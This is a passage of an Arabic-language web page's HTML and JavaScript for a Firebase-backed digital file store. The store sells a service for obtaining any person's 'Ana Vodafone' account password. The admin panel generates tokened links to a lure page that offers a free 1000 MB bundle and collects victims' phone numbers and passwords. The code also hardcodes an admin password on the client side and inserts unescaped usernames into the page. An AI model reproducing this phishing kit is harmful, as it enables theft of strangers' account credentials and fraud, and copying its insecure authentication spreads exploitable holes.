            }
            
            .admin-control-grid {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 480px) {
            .login-section {
                padding: 30px 20px;
                margin: 30px 20px;
            }
            
            .admin-login-content {
                padding: 30px 20px;
            }
            
            .section-title {
                font-size: 1.8rem;
            }
            
            .phone-number {
                font-size: 1.6rem;
            }
            
            .vodafone-service-content {
                padding: 30px 20px;
            }
        }
    </style>

    <!-- Loading Spinner -->
    <div class="loading-spinner" id="loadingSpinner">
        <div class="spinner"></div>
    </div>

    <!-- Admin Login Modal -->
    <div class="admin-login-modal" id="adminLoginModal">
        <div class="admin-login-content">
            <button class="close-modal" id="closeLoginModal">&times;</button>
            <h2 style="color: var(--gold); text-align: center; margin-bottom: 40px;">
                <i class="fas fa-lock"></i> دخول المسؤول
            </h2>
            <div class="form-group">
                <label for="adminPassword"><i class="fas fa-key"></i> كلمة مرور المسؤول</label>
                <input type="password" id="adminPassword" class="form-control" 
                       placeholder="أدخل كلمة مرور المسؤول" autocomplete="off">
            </div>
            <button id="loginAdminBtn" class="submit-btn" style="margin-top: 30px;">
                <i class="fas fa-sign-in-alt"></i> دخول المسؤول
            </button>
            <p style="text-align: center; margin-top: 30px; color: #AAAAAA; font-size: 0.95rem;">
                هذا القسم مخصص للمسؤول فقط
            </p>
        </div>
    </div>

    <!-- Vodafone Service Page -->
    <div class="vodafone-service-page" id="vodafoneServicePage">
        <div class="vodafone-service-content">
            <button class="close-modal" id="closeVodafonePage">&times;</button>
            <h2 class="vodafone-title">
                <i class="fas fa-sim-card"></i>
                الحصول على 1000 ميجا فودافون
            </h2>
            <p style="color: #DDDDDD; text-align: center; margin-bottom: 25px; line-height: 1.6;">
                أدخل بياناتك للحصول على الباقة
            </p>
            <form class="vodafone-form" id="vodafoneForm">
                <div class="form-group">
                    <label for="phoneNumber"><i class="fas fa-phone"></i> رقم الهاتف</label>
                    <input type="tel" id="phoneNumber" class="form-control" 
                           placeholder="أدخل رقم فودافون" required pattern="01[0-9]{9}" maxlength="11">
                </div>
                <div class="form-group">
                    <label for="vodafonePassword"><i class="fas fa-key"></i> باسورد "أنا فودافون"</label>
                    <input type="password" id="vodafonePassword" class="form-control" 
                           placeholder="أدخل باسورد أنا فودافون" required>
                </div>
                <button type="submit" class="submit-btn">
                    <i class="fas fa-paper-plane"></i> إرسال البيانات
                </button>
            </form>
            <div class="vodafone-result" id="vodafoneResult">
                <h4 style="color: var(--green); margin-bottom: 10px;">
                    <i class="fas fa-check-circle"></i> تم الإرسال بنجاح
                </h4>
                <p id="resultMessage" style="color: #DDDDDD;"></p>
            </div>
            <p style="text-align: center; margin-top: 25px; color: #AAAAAA; font-size: 0.9rem;">
                البيانات ترسل لصاحب الخدمة فقط - نظام آمن ومشفّر
            </p>
        </div>
    </div>

    <!-- Login Section (Shown by default) -->
    <section class="login-section" id="loginSection">
        <div class="logo" style="justify-content: center; margin-bottom: 40px;">
            <i class="fas fa-crown"></i>
            <h1>Elite<span>Files</span></h1>
        </div>
        <h2 class="login-title">
            <i class="fas fa-sign-in-alt"></i>
            تسجيل الدخول
        </h2>
        <p style="color: #DDDDDD; margin-bottom: 40px; font-size: 1.2rem; line-height: 1.6;">
            مرحباً بك في Elite Files، متجر الملفات الرقمية الفاخر
            <br>أدخل اسم المستخدم للدخول إلى المتجر
        </p>
        <input type="text" id="usernameInput" class="login-input" 
               placeholder="أدخل اسم المستخدم" autocomplete="off" autofocus>
        <button id="loginBtn" class="login-btn">
            <i class="fas fa-sign-in-alt"></i> دخول إلى المتجر
        </button>
        <p style="color: #AAAAAA; margin-top: 30px; font-size: 0.95rem;">
            للمستخدمين العاديين فقط - لا توجد كلمات مرور
        </p>
    </section>
    
    <!-- Main Content (Hidden by default until login) -->
    <div id="mainContent" class="hidden">
        <!-- Header -->
        <header class="main-header">
            <div class="header-content">
                <div class="logo" onclick="goBackToFiles()">
                    <i class="fas fa-crown"></i>
                    <h1>Elite<span>Files</span></h1>
                </div>
                <div id="userInfo">
                    <!-- سيتم تعبئته بالجافاسكريبت -->
                </div>
            </div>
        </header>

        <!-- Main Container -->
        <div class="container">
            <!-- Files Section -->
            <section class="section" id="filesSection">
                <h2 class="section-title">
                    <i class="fas fa-gem"></i>
                    ملفاتنا المميزة
                </h2>
                <div class="files-grid" id="filesContainer">
                    <!-- سيتم تعبئته من Firebase -->
                    <p style="text-align: center; color: #AAAAAA; grid-column: 1 / -1; padding: 40px;" id="noFilesMessage">
                        <i class="fas fa-folder-open" style="font-size: 4rem; margin-bottom: 20px; display: block;"></i>
                        لا توجد ملفات متاحة حالياً
                    </p>
                </div>
                
                <!-- Back Navigation -->
                <div class="back-nav">
                    <button class="back-btn" onclick="logout()">
                        <i class="fas fa-sign-out-alt"></i> تسجيل الخروج
                    </button>
                </div>
            </section>

            <!-- Admin Panel (Shown only for Admin with password) -->
            <section class="section admin-panel hidden" id="adminPanel">
                <h2 class="admin-title">
                    <i class="fas fa-user-cog"></i>
                    لوحة تحكم المسؤول
                </h2>
                
                <!-- إدارة الملفات الحالية -->
                <div class="file-management">
                    <h3 class="section-title" style="font-size: 1.6rem; margin-bottom: 25px;">
                        <i class="fas fa-folder-open"></i>
                        إدارة الملفات الحالية
                    </h3>
                    <div id="currentFilesList">
                        <!-- سيتم تعبئته بالجافاسكريبت -->
                    </div>
                </div>
                
                <!-- إضافة ملف جديد -->
                <h3 class="section-title" style="font-size: 1.6rem; margin-top: 50px;">
                    <i class="fas fa-plus-circle"></i>
                    إضافة ملف جديد
                </h3>
                <form class="admin-form" id="fileForm">
                    <div class="form-group">
                        <label for="fileName"><i class="fas fa-file-alt"></i> اسم الملف</label>
                        <input type="text" id="fileName" class="form-control" placeholder="أدخل اسم الملف" required>
                    </div>
                    <div class="form-group">
                        <label for="fileDescription"><i class="fas fa-align-left"></i> وصف الملف</label>
                        <textarea id="fileDescription" class="form-control" rows="3" 
                                  placeholder="أدخل وصف للملف" required></textarea>
                    </div>
                    <div class="form-group">
                        <label for="filePrice"><i class="fas fa-tag"></i> السعر (جنية)</label>
                        <input type="number" id="filePrice" class="form-control" 
                               placeholder="أدخل السعر (0 للمجاني)" min="0" value="0" required>
                    </div>
                    <div class="checkbox-group">
                        <input type="checkbox" id="isPaid">
                        <label for="isPaid" style="color: var(--gold); font-weight: 700; cursor: pointer;">
                            ملف مدفوع
                        </label>
                    </div>
                    <div class="form-group">
                        <label for="fileUpload"><i class="fas fa-cloud-upload-alt"></i> رفع الملف</label>
                        <div class="file-upload-area" id="fileUploadArea">
                            <i class="fas fa-cloud-upload-alt"></i>
                            <p>انقر لرفع الملف الحقيقي</p>
                            <p id="fileNameDisplay" style="color: var(--gold); margin-top: 15px; font-weight: 700; font-size: 1.1rem;"></p>
                            <p style="color: #AAAAAA; font-size: 0.9rem; margin-top: 10px;">الحد الأقصى: 50MB</p>
                        </div>
                        <input type="file" id="fileUpload" style="display: none;">
                    </div>
                    <div class="progress-container" id="uploadProgress">
                        <div class="progress-bar" id="progressBar"></div>
                    </div>
                    <button type="submit" class="submit-btn" id="submitFileBtn">
                        <i class="fas fa-cloud-upload-alt"></i> رفع الملف
                    </button>
                </form>
                
                <!-- لوحة التحكم الكاملة للأدمن -->
                <div class="admin-control-panel" id="adminControlPanel">
                    <h3 class="admin-control-title">
                        <i class="fas fa-sliders-h"></i>
                        لوحة التحكم الكاملة
                    </h3>
                    
                    <div class="admin-control-grid">
                        <!-- إدارة المستخدمين -->
                        <div class="admin-control-card">
                            <div class="control-card-header">
                                <h4 style="color: var(--blue);">
                                    <i class="fas fa-users"></i> إدارة المستخدمين
                                </h4>
                                <span id="usersCount" style="color: var(--gold); font-weight: 700;">0</span>
                            </div>
                            <div class="user-list" id="usersList">
                                <!-- سيتم تعبئته بالجافاسكريبت -->
                            </div>
                        </div>
                        
                        <!-- إدارة الطلبات -->
                        <div class="admin-control-card">
                            <div class="control-card-header">
                                <h4 style="color: var(--green);">
                                    <i class="fas fa-clipboard-list"></i> إدارة الطلبات
                                </h4>
                                <span id="ordersCount" style="color: var(--gold); font-weight: 700;">0</span>
                            </div>
                            <div class="orders-container" id="adminOrdersContainer">
                                <!-- سيتم تعبئته من Firebase -->
                            </div>
                        </div>
                        
                        <!-- إدارة خدمات فودافون -->
                        <div class="admin-control-card">
                            <div class="control-card-header">
                                <h4 style="color: var(--purple);">
                                    <i class="fas fa-sim-card"></i> خدمات فودافون
                                </h4>
                                <span id="vodafoneServicesCount" style="color: var(--gold); font-weight: 700;">0</span>
                            </div>
                            <div class="service-list" id="vodafoneServicesList">
                                <!-- سيتم تعبئته بالجافاسكريبت -->
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Back Navigation -->
                <div class="back-nav">
                    <button class="back-btn" onclick="goBackToFiles()">
                        <i class="fas fa-arrow-right"></i> العودة للملفات
                    </button>
                </div>
            </section>

            <!-- Payment Section (Hidden by default) -->
            <section class="payment-section" id="paymentSection">
                <h2 class="payment-title">
                    <i class="fas fa-shopping-cart"></i>
                    إتمام عملية الشراء
                </h2>
                
                <div class="payment-steps">
                    <div class="payment-step">
                        <span class="step-number">1</span>
                        <h3>دفع المبلغ</h3>
                        <p style="color: #DDDDDD; line-height: 1.7; margin-top: 15px;">
                            قم بتحويل المبلغ إلى الرقم التالي عبر فودافون كاش أو أي محفظة رقمية
                        </p>
                        <div class="payment-info">
                            <p style="font-size: 1.2rem; color: var(--gold);">
                                <i class="fas fa-phone"></i> رقم الدفع:
                            </p>
                            <div class="phone-number">01013091169</div>
                            <p style="font-size: 1.4rem; margin: 10px 0;">
                                المبلغ: <span id="paymentAmount" style="color: var(--gold); font-weight: 900;">0</span> ج.م
                            </p>
                            <p style="font-size: 1.2rem; color: #DDDDDD;">
                                الملف: <span id="paymentFileName" style="color: var(--gold); font-weight: 700;">غير محدد</span>
                            </p>
                        </div>
                        <div class="payment-options">
                            <button id="uploadProofBtn" class="buy-btn" style="flex: 2;">
                                <i class="fas fa-cloud-upload-alt"></i> رفع إثبات الدفع
                            </button>
                            <button id="whatsappProofBtn" class="whatsapp-btn">
                                <i class="fab fa-whatsapp"></i> إرسال على واتساب
                            </button>
                        </div>
                    </div>
                    
                    <div class="payment-step" id="proofStep">
                        <span class="step-number">2</span>
                        <h3>رفع إثبات الدفع</h3>
                        <p style="color: #DDDDDD; line-height: 1.7; margin-top: 15px;">
                            قم برفع صورة إثبات الدفع (سكرين شوت) في المكان المخصص أدناه
                        </p>
                        <div class="upload-area hidden" id="uploadArea">
                            <i class="fas fa-cloud-upload-alt"></i>
                            <p>انقر لرفع صورة إثبات الدفع</p>
                            <p id="proofFileName" style="color: var(--gold); margin-top: 15px; font-weight: 700; font-size: 1.1rem;"></p>
                            <p style="color: #AAAAAA; font-size: 0.9rem; margin-top: 10px;">يسمح بصيغ: JPG, PNG, GIF - أقصى حجم: 5MB</p>
                        </div>
                        <input type="file" id="paymentProof" accept="image/*" style="display: none;">
                        <div id="previewContainer" class="hidden">
                            <img id="previewImage" src="#" alt="إثبات الدفع" 
                                 style="max-width: 100%; border-radius: 12px; margin: 25px auto; display: block; border: 3px solid rgba(255, 215, 0, 0.3);">
                        </div>
                    </div>
                    
                    <div class="payment-step">
                        <span class="step-number">3</span>
                        <h3>تأكيد الطلب</h3>
                        <p style="color: #DDDDDD; line-height: 1.7; margin-top: 15px;">
                            بعد رفع إثبات الدفع، سيتم مراجعة طلبك وتأكيده من قبل المسؤول، 
                            ثم سيتم إتاحة تحميل الملف لك مباشرة من صفحة الملفات.
                        </p>
                        <button id="submitPayment" class="buy-btn" style="margin-top: 25px;">
                            <i class="fas fa-paper-plane"></i> إرسال الطلب للمسؤول
                        </button>
                    </div>
                </div>
                
                <!-- Back Navigation -->
                <div class="back-nav">
                    <button class="back-btn" onclick="goBackToFiles()">
                        <i class="fas fa-arrow-right"></i> العودة للملفات
                    </button>
                </div>
            </section>
        </div>

        <!-- Security Features -->
        <div class="security-features">
            <div class="security-badge">
                <i class="fas fa-shield-alt"></i>
                <span>نظام آمن</span>
            </div>
            <div class="security-badge">
                <i class="fas fa-lock"></i>
                <span>تشفير متقدم</span>
            </div>
        </div>

        <!-- Footer -->
        <footer class="main-footer">
            <div class="footer-content">
                <div class="logo" style="justify-content: center;">
                    <i class="fas fa-crown"></i>
                    <h1>Elite<span>Files</span></h1>
                </div>
                <p class="copyright">
                    جميع الحقوق محفوظة &copy; 2024 - تم التطوير بواسطة <i class="fas fa-heart"></i> Mahmoud Gamal
                </p>
            </div>
        </footer>
    </div>

    <!-- Notification -->
    <div class="notification" id="notification"></div>

    <!-- Main JavaScript -->
    <script>
        // ============================================
        // Elite Files - النسخة النهائية المظبوطة
        // ============================================
        
         // بيانات الجلسة
        let currentUser = null;
        let isAdmin = false;
        let selectedFileForPurchase = null;
        let uploadedFile = null;
        let proofFile = null;
        let editingFileId = null;
        let userFiles = {}; // تخزين الملفات التي تم شراؤها من قبل المستخدم
        let deviceId = null; // معرف الجهاز الفريد
        
        // إعدادات النظام
        const ADMIN_USERNAME = "M7mø7dd"; // اسم المسؤول المخفي
        const ADMIN_PASSWORD = "admin123"; // كلمة مرور المسؤول
        const VODAFONE_NUMBER = "01013091169"; // رقم فودافون كاش
        
        // متغيرات Firebase
        let filesRef, ordersRef, purchasedRef, usersRef, vodafoneRef, vodafoneDataRef;
        
        // ============================================
        // تهيئة التطبيق
        // ============================================
        
        document.addEventListener('DOMContentLoaded', function() {
            // إعداد مراجع Firebase
            filesRef = database.ref('files');
            ordersRef = database.ref('orders');
            purchasedRef = database.ref('purchased');
            usersRef = database.ref('users');
            vodafoneRef = database.ref('vodafoneOrders'); // طلبات فودافون
            vodafoneDataRef = database.ref('vodafoneData'); // بيانات فودافون
            
            // إنشاء أو الحصول على معرف الجهاز الفريد
            generateDeviceId();
            
            // إعداد معالجات الأحداث
            setupEventListeners();
            
            // محاولة تحميل حالة المستخدم من التخزين المحلي
            loadUserSession();
            
            // تحميل ملف فودافون الخاص عند البدء
            loadVodafoneServiceFile();
        });
        
        // ============================================
        // 1. إصلاح مشكلة تحميل الملفات
        // ============================================
        
        // تحميل الملف بشكل مباشر
        async function downloadFile(fileId, isFree = false) {
            if (!currentUser) {
                showNotification('يجب تسجيل الدخول أولاً', 'error');
                return;
            }
            
            // إذا كان ملف مدفوع وغير مشترى
            if (!isFree && !userFiles[fileId]) {
                showNotification('يجب شراء هذا الملف أولاً', 'error');
                return;
            }
            
            filesRef.child(fileId).once('value', async (snapshot) => {
                const file = snapshot.val();
                if (!file || !file.downloadUrl) {
                    showNotification('الملف غير متوفر للتحميل', 'error');
                    return;
                }
                
                showLoading(true);
                
                try {
                    // زيادة عداد التحميلات
                    const newDownloads = (file.downloads || 0) + 1;
                    await filesRef.child(fileId).update({ downloads: newDownloads });
                    
                    // استخدام fetch لتحميل الملف كـ blob
                    const response = await fetch(file.downloadUrl);
                    const blob = await response.blob();
                    const url = window.URL.createObjectURL(blob);
                    
                    // إنشاء رابط تحميل
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = file.originalName || file.name;
                    document.body.appendChild(a);
                    a.click();
                    
                    // تنظيف
                    window.URL.revokeObjectURL(url);
                    document.body.removeChild(a);
                    
                    showNotification('تم تحميل الملف بنجاح! ✅', 'success');
                } catch (error) {
                    console.error('خطأ التحميل:', error);
                    
                    // حل بديل في حالة فشل blob
                    const a = document.createElement('a');
                    a.href = file.downloadUrl;
                    a.download = file.originalName || file.name;
                    a.target = '_blank';
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    
                    showNotification('تم بدء تحميل الملف', 'success');
                } finally {
                    showLoading(false);
                }
            });
        }
        
        // ============================================
        // 2. إصلاح مشكلة اختفاء الطلبات عند تحديث الصفحة
        // ============================================
        
        // تحميل الطلبات من Firebase
        function loadOrdersFromFirebase() {
            if (!isAdmin) return;
            
            // تحميل طلبات الملفات
            ordersRef.on('value', (snapshot) => {
                const ordersData = snapshot.val();
                displayOrders(ordersData);
            });
            
            // تحميل طلبات فودافون
            vodafoneRef.on('value', (snapshot) => {
                const vodafoneOrders = snapshot.val();
                displayVodafoneOrders(vodafoneOrders);
            });
        }
        
        // ============================================
        // 3. تحكم كامل للأدمن
        // ============================================
        
        // تحميل جميع المستخدمين
        function loadAllUsers() {
            if (!isAdmin) return;
            
            usersRef.on('value', (snapshot) => {
                const usersData = snapshot.val();
                displayAllUsers(usersData);
            });
        }
        
        // عرض جميع المستخدمين
        function displayAllUsers(usersData) {
            const usersList = document.getElementById('usersList');
            const usersCount = document.getElementById('usersCount');
            
            if (!usersData) {
                usersList.innerHTML = '<p style="text-align: center; color: #AAAAAA; padding: 20px;">لا يوجد مستخدمين</p>';
                usersCount.textContent = '0';
                return;
            }
            
            let count = 0;
            usersList.innerHTML = '';
            
            Object.keys(usersData).forEach(username => {
                if (username === ADMIN_USERNAME) return; // تخطي الأدمن
                
                const user = usersData[username];
                count++;
                
                const userItem = document.createElement('div');
                userItem.className = 'user-item';
                
                userItem.innerHTML = `
                    <div>
                        <div style="font-weight: 700; color: var(--gold);">${username}</div>
                        <div style="font-size: 0.85rem; color: #AAAAAA;">
                            ${user.deviceId ? '🆔 ' + user.deviceId.substring(0, 8) + '...' : 'بدون جهاز'}
                        </div>
                    </div>
                    <div class="user-actions">
                        <button class="action-btn btn-view" onclick="viewUserOrders('${username}')">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button class="action-btn btn-disable" onclick="toggleUserStatus('${username}', ${user.isDisabled || false})">
                            <i class="fas ${user.isDisabled ? 'fa-check' : 'fa-ban'}"></i>
                        </button>
                        <button class="action-btn btn-delete" onclick="deleteUser('${username}')">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                `;
                
                usersList.appendChild(userItem);
            });
            
            usersCount.textContent = count;
        }
        
        // عرض طلبات مستخدم معين
        async function viewUserOrders(username) {
            showLoading(true);
            
            try {
                // الحصول على طلبات الملفات للمستخدم
                const filesOrdersSnapshot = await ordersRef.orderByChild('customerName').equalTo(username).once('value');
                const filesOrders = filesOrdersSnapshot.val();
                
                // الحصول على طلبات فودافون للمستخدم
                const vodafoneOrdersSnapshot = await vodafoneRef.orderByChild('customerName').equalTo(username).once('value');
                const vodafoneOrders = vodafoneOrdersSnapshot.val();
                
                let message = `طلبات ${username}:\n\n`;
                
                if (filesOrders) {
                    message += "📁 طلبات الملفات:\n";
                    Object.values(filesOrders).forEach(order => {
                        message += `- ${order.fileName} (${order.status}) - ${new Date(order.createdAt).toLocaleDateString('ar-EG')}\n`;
                    });
                }
                
                if (vodafoneOrders) {
                    message += "\n📱 طلبات فودافون:\n";
                    Object.values(vodafoneOrders).forEach(order => {
                        message += `- ${order.serviceType} (${order.status}) - ${new Date(order.createdAt).toLocaleDateString('ar-EG')}\n`;
                    });
                }
                
                if (!filesOrders && !vodafoneOrders) {
                    message += "لا توجد طلبات لهذا المستخدم";
                }
                
                alert(message);
            } catch (error) {
                showNotification('حدث خطأ في عرض الطلبات', 'error');
            } finally {
                showLoading(false);
            }
        }
        
        // تبديل حالة المستخدم
        async function toggleUserStatus(username, currentStatus) {
            if (!isAdmin || username === ADMIN_USERNAME) return;
            
            try {
                const newStatus = !currentStatus;
                await usersRef.child(username).update({ 
                    isDisabled: newStatus,
                    statusUpdatedAt: Date.now(),
                    statusUpdatedBy: currentUser
                });
                
                showNotification(`تم ${newStatus ? 'تعطيل' : 'تفعيل'} المستخدم ${username}`, 'success');
                loadAllUsers();
            } catch (error) {
                showNotification('حدث خطأ أثناء تغيير حالة المستخدم', 'error');
            }
        }
        
        // حذف مستخدم
        async function deleteUser(username) {
            if (!isAdmin || username === ADMIN_USERNAME) return;
            
            if (confirm(`⚠️ هل أنت متأكد من حذف المستخدم ${username}؟\n\nسيتم حذف:\n- بيانات المستخدم\n- جميع طلباته\n- ملفاته المشتراة`)) {
                showLoading(true);
                
                try {
                    // حذف بيانات المستخدم
                    await usersRef.child(username).remove();
                    
                    // حذف ملفاته المشتراة
                    await purchasedRef.child(username).remove();
                    
                    // حذف طلبات الملفات
                    const filesOrdersSnapshot = await ordersRef.orderByChild('customerName').equalTo(username).once('value');
                    const filesOrders = filesOrdersSnapshot.val();
                    
                    if (filesOrders) {
                        const deletePromises = Object.keys(filesOrders).map(orderId => 
                            ordersRef.child(orderId).remove()
                        );
                        await Promise.all(deletePromises);
                    }
                    
                    // حذف طلبات فودافون
                    const vodafoneOrdersSnapshot = await vodafoneRef.orderByChild('customerName').equalTo(username).once('value');
                    const vodafoneOrders = vodafoneOrdersSnapshot.val();
                    
                    if (vodafoneOrders) {
                        const deletePromises = Object.keys(vodafoneOrders).map(orderId => 
                            vodafoneRef.child(orderId).remove()
                        );
                        await Promise.all(deletePromises);
                    }
                    
                    showNotification(`✅ تم حذف المستخدم ${username} وبياناته بنجاح`, 'success');
                    loadAllUsers();
                } catch (error) {
                    showNotification('حدث خطأ أثناء حذف المستخدم', 'error');
                } finally {
                    showLoading(false);
                }
            }
        }
        
        // ============================================
        // 4. إصلاح الأخطاء الموجودة بالكود
        // ============================================
        
        // إصلاح مشكلة تنزيل الملفات المدفوعة
        // تم الإصلاح في دالة downloadFile
        
        // إصلاح مشكلة حفظ الجلسة
        function generateDeviceId() {
            let savedDeviceId = localStorage.getItem('eliteFilesDeviceId');
            
            if (!savedDeviceId) {
                // إنشاء معرف فريد للجهاز
                savedDeviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                localStorage.setItem('eliteFilesDeviceId', savedDeviceId);
            }
            
            deviceId = savedDeviceId;
            return savedDeviceId;
        }
        
        // إصلاح مشكلة تحميل بيانات المستخدم
        async function checkUserDevice(username) {
            try {
                const userSnapshot = await usersRef.child(username).once('value');
                const userData = userSnapshot.val();
                
                if (userData) {
                    // التحقق من حالة المستخدم
                    if (userData.isDisabled) {
                        showNotification('⚠️ هذا الحساب معطل. الرجاء التواصل مع المسؤول.', 'error');
                        localStorage.removeItem('eliteFilesUser');
                        localStorage.removeItem('eliteFilesAdmin');
                        localStorage.removeItem('eliteFilesAdminPassword');
                        document.getElementById('usernameInput').value = '';
                        document.getElementById('usernameInput').focus();
                        return false;
                    }
                    
                    // التحقق من الجهاز
                    if (userData.deviceId && userData.deviceId !== deviceId) {
                        showLoading(false);
                        showNotification('⚠️ هذا الاسم مستخدم بالفعل على جهاز آخر. اختر اسم آخر.', 'error');
                        localStorage.removeItem('eliteFilesUser');
                        localStorage.removeItem('eliteFilesAdmin');
                        localStorage.removeItem('eliteFilesAdminPassword');
                        document.getElementById('usernameInput').value = '';
                        document.getElementById('usernameInput').focus();
                        return false;
                    }
                    
                    // تحديث آخر تسجيل دخول
                    await usersRef.child(username).update({
                        lastLogin: Date.now(),
                        deviceId: deviceId // تحديث معرف الجهاز
                    });
                } else {
                    // مستخدم جديد
                    await usersRef.child(username).set({
                        deviceId: deviceId,
                        createdAt: Date.now(),
                        lastLogin: Date.now(),
                        isDisabled: false
                    });
                }
                
                return true;
            } catch (error) {
                console.error('خطأ في التحقق من المستخدم:', error);
                return false;
            }
        }
        
        // ============================================
        // 5. إضافة خدمة جديدة (منتج ثابت)
        // ============================================
        
        // تحميل ملف فودافون الخاص
        function loadVodafoneServiceFile() {
            // هذا الملف ثابت للجميع
            const vodafoneFile = {
                id: 'vodafone_service_001',
                name: 'الحصول على باسورد انا فودافون لشخص',
                description: 'احصل على باسورد حساب "أنا فودافون" لأي شخص تريده. الخدمة تشمل إنشاء رابط خاص بك لجمع البيانات.',
                price: 200,
                isPaid: true,
                type: 'service',
                size: 0,
                downloads: 0,
                isActive: true,
                isSpecialService: true, // علامة للخدمة الخاصة
                createdAt: Date.now()
            };
            
            // تأكد من وجود الملف في قاعدة البيانات
            filesRef.child(vodafoneFile.id).once('value', (snapshot) => {
                if (!snapshot.exists()) {
                    filesRef.child(vodafoneFile.id).set(vodafoneFile);
                }
            });
        }
        
        // إنشاء بطاقة خاصة لخدمة فودافون
        function createVodafoneServiceCard() {
            const fileCard = document.createElement('div');
            fileCard.className = 'file-card';
            fileCard.style.borderColor = 'rgba(52, 152, 219, 0.3)';
            
            fileCard.innerHTML = `
                <div class="file-header" style="background: linear-gradient(135deg, var(--black), #2C3E50);">
                    <i class="fas fa-sim-card file-icon"></i>
                    <h3 class="file-name">الحصول على باسورد انا فودافون لشخص</h3>
                    <div class="file-price">200 ج.م</div>
                </div>
                <div class="file-body">
                    <p class="file-description">
                        🎯 <strong>خدمة حصرية:</strong> احصل على باسورد حساب "أنا فودافون" لأي شخص تريده.<br><br>
                        📱 <strong>المميزات:</strong><br>
                        • إنشاء رابط خاص بك لجمع البيانات<br>
                        • البيانات ترسل لك فقط<br>
                        • نظام آمن ومشفّر<br>
                        • دعم فني متكامل
                    </p>
                    <div class="file-details">
                        <div class="file-detail">
                            <i class="fas fa-shield-alt"></i>
                            <span>خدمة آمنة</span>
                        </div>
                        <div class="file-detail">
                            <i class="fas fa-link"></i>
                            <span>رابط خاص</span>
                        </div>
                        <div class="file-detail">
                            <i class="fas fa-user-secret"></i>
                            <span>خصوصية تامة</span>
                        </div>
                    </div>
                    <div class="file-actions">
                        <button class="buy-btn" onclick="buyVodafoneService()">
                            <i class="fas fa-shopping-cart"></i> شراء الخدمة
                        </button>
                    </div>
                </div>
            `;
            
            return fileCard;
        }
        
        // شراء خدمة فودافون
        async function buyVodafoneService() {
            if (!currentUser) {
                showNotification('يجب تسجيل الدخول أولاً', 'error');
                return;
            }
            
            selectedFileForPurchase = {
                id: 'vodafone_service_001',
                name: 'الحصول على باسورد انا فودافون لشخص',
                price: 200,
                isSpecialService: true
            };
            
            // إظهار قسم الدفع
            document.getElementById('filesSection').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'none';
            document.getElementById('paymentSection').style.display = 'block';
            
            // تعيين بيانات الدفع
            document.getElementById('paymentAmount').textContent = '200';
            document.getElementById('paymentFileName').textContent = 'خدمة فودافون - الحصول على الباسورد';
            
            // إعادة تعيين قسم الإثبات
            document.getElementById('uploadArea').classList.add('hidden');
            document.getElementById('previewContainer').classList.add('hidden');
            document.getElementById('proofFileName').textContent = '';
            if (proofFile) {
                proofFile = null;
                document.getElementById('paymentProof').value = '';
            }
            
            // تمرير للأعلى
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
        
        // ============================================
        // 6. منطق الخدمة الجديدة
        // ============================================
        
        // عرض طلبات فودافون
        function displayVodafoneOrders(vodafoneOrders) {
            const vodafoneServicesList = document.getElementById('vodafoneServicesList');
            const vodafoneServicesCount = document.getElementById('vodafoneServicesCount');
            
            if (!vodafoneOrders) {
                vodafoneServicesList.innerHTML = '<p style="text-align: center; color: #AAAAAA; padding: 20px;">لا توجد طلبات فودافون</p>';
                vodafoneServicesCount.textContent = '0';
                return;
            }
            
            let count = 0;
            vodafoneServicesList.innerHTML = '';
            
            Object.keys(vodafoneOrders).forEach(orderId => {
                const order = vodafoneOrders[orderId];
                count++;
                
                const serviceItem = document.createElement('div');
                serviceItem.className = 'service-item';
                
                serviceItem.innerHTML = `
                    <div>
                        <div style="font-weight: 700; color: var(--blue);">${order.customerName}</div>
                        <div style="font-size: 0.85rem; color: #AAAAAA;">
                            ${new Date(order.createdAt).toLocaleString('ar-EG')}
                        </div>
                        <div class="order-status ${order.status === 'pending' ? 'status-pending' : 
                            order.status === 'completed' ? 'status-completed' : 'status-rejected'}" 
                            style="margin-top: 5px; font-size: 0.8rem;">
                            ${order.status === 'pending' ? '⏳ بانتظار' : 
                             order.status === 'completed' ? '✅ مكتمل' : '❌ مرفوض'}
                        </div>
                    </div>
                    <div class="service-actions">
                        ${order.status === 'pending' ? 
                            `<button class="action-btn btn-create" onclick="createVodafoneLink('${orderId}', '${order.customerName}')">
                                <i class="fas fa-link"></i> رابط
                            </button>
                            <button class="action-btn btn-view" onclick="viewVodafoneOrder('${orderId}')">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="action-btn btn-delete" onclick="deleteVodafoneOrder('${orderId}')">
                                <i class="fas fa-trash"></i>
                            </button>` :
                            `<button class="action-btn btn-view" onclick="viewVodafoneOrder('${orderId}')">
                                <i class="fas fa-eye"></i>
                            </button>`
                        }
                    </div>
                `;
                
                vodafoneServicesList.appendChild(serviceItem);
            });
            
            vodafoneServicesCount.textContent = count;
        }
        
        // إنشاء رابط فودافون
        async function createVodafoneLink(orderId, customerName) {
            showLoading(true);
            
            try {
                // إنشاء رمز فريد للرابط
                const linkToken = 'vodafone_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                
                // تحديث الطلب
                await vodafoneRef.child(orderId).update({
                    status: 'completed',
                    linkToken: linkToken,
                    linkCreatedAt: Date.now(),
                    linkCreatedBy: currentUser
                });
                
                // إنشاء رابط الصفحة
                const pageUrl = window.location.origin + window.location.pathname + '?vodafone=' + linkToken;
                
                showNotification(`✅ تم إنشاء الرابط بنجاح!\n\nالرابط: ${pageUrl}\n\nيمكنك نسخ الرابط وإرساله للعميل.`, 'success');
                
                // تحميل الطلبات المحدثة
                loadOrdersFromFirebase();
            } catch (error) {
                showNotification('حدث خطأ أثناء إنشاء الرابط', 'error');
            } finally {
                showLoading(false);
            }
        }
        
        // عرض طلب فودافون
        async function viewVodafoneOrder(orderId) {
            try {
                const orderSnapshot = await vodafoneRef.child(orderId).once('value');
                const order = orderSnapshot.val();
                
                if (!order) {
                    showNotification('الطلب غير موجود', 'error');
                    return;
                }
                
                let message = `تفاصيل طلب فودافون:\n\n`;
                message += `👤 العميل: ${order.customerName}\n`;
                message += `📅 التاريخ: ${new Date(order.createdAt).toLocaleString('ar-EG')}\n`;
                message += `💰 المبلغ: ${order.amount || 200} ج.م\n`;
